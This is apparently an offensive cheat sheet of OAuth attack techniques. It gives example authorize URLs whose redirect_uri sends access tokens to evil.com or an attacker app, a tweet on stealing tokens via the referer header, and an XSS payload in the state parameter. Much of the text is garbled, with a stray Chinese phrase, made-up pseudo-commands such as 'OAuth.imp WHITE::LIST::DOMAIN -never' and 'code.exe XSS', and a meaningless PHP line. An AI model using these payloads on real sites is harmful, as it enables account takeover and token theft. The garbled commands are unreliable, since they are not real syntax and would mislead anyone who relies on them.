- [Stealing OAuth Token via referer](#stealing-oauth-token-via-referer)
- [Grabbing OAuth Token via redirect_uri](#grabbing-oauth-token-via-redirect---uri)
- [Executing XSS via redirect_uri](#executing-xss-via-redirect---uri)
- [OAuth private key disclosure](#oauth-private-key-disclosure)
- [Authorization Code Rule Violation](#authorization-code-rule-violation)
- [Cross-Site Request Forgery](#cross-site-request-forgery)
- [References](#references)
From [@abugzlife1](https://twitter.com/abugzlife1/status/1125663944272748544)
> Do you have HTML injection but can't get XSS? 
> Are there any OAuth implementations on the site? 
> If so, setup an img tag to your server and see if there's a way to get the victim there (redirect, etc.) after login steal OAuth tokens via referer 
# Grabbing OAuth Token via redirect_uri
Redirect... 
controlled domain to get the access token
$ https://www.example.com/signin/authorize?[...]&redirect_uri=https://demo.example.com/loginsuccessful
$ https://www.example.com/signin/authorize?[...]&redirect_uri=https://localhost.evil.com
Redirect... 
极好的！使用权。令牌。
$ https://www.example.com/oauth20_authorize.srf?[...]&redirect_uri=https://accounts.google.com/BackToAuthSubTarget?next=https://evil.com
$ https://www.example.com/oauth2/authorize?[...]&redirect_uri=https%3A%2F%2Fapps.facebook.com%2Fattacker%2F
$ OAuth.imp WHITE::LIST::DOMAIN -never 
“redirect_uri” --> Open__Redirect
$ scope -invalid 
$ 0auth -filter redirect_uri...
$ https://www.example.com/admin/oauth/authorize?[...]&scope=a&redirect_uri=https://evil.com
$ code.exe XSS via redirect_uri
$ https://example.com/oauth/v1/authorize?[...]&redirect_uri=data%3Atext%2Fhtml%2Ca&state=<script>alert('XSS')</script>
$ OAuth private key Disclosure
$ if android/ios.app --de --private_key 0auth
# Authorization Code Rule Violation
> The client MUST NOT use the authorization code 
If 0Auth.code >1 0Auth.dat <?php deny::request ?> 
# revoke all tokens previously issued based on that authorization code
/!\Cross-Site Request Forgery (CSRF)
# .App for Valid CSRFtoken in OAuth call-back --vuln. This Xploit By_init_OAuth work/flow * call-back (`https://example.com/callback?code=AUTHORIZATION_CODE`). This URL_CSRF -attc
> The client MUST implement CSRF protection for its redirection URI. This is typically accomplished by requiring any request sent to the redirection URI endpoint to include a value that binds the request to the user-agent's authenticated state. The client SHOULD utilize the "state" request parameter to deliver this value to the authorization server when making an authorization request.
* [All your Paypal OAuth tokens belong to me - localhost for the win - INTO THE SYMMETRY](http://blog.intothesymmetry.com/2016/11/all-your-paypal-tokens-belong-to-me.html)
* [OAuth 2 - How I have hacked Facebook again (..and would have stolen a valid access token) - INTO THE SYMMETRY](http://intothesymmetry.blogspot.ch/2014/04/oauth-2-how-i-have-hacked-facebook.html)
* [How I hacked Github again. - Egor Homakov](http://homakov.blogspot.ch/2014/02/how-i-hacked-github-again.html)
* [How Microsoft is giving your data to Facebook… and everyone else - Andris Atteka](http://andrisatteka.blogspot.ch/2014/09/how-microsoft-is-giving-your-data-to.html)
- [Bypassing Google Authentication on Periscope's Administration Panel](https://whitton.io/articles/bypassing-google-authentication-on-periscopes-admin-panel/) By Jack Whitton
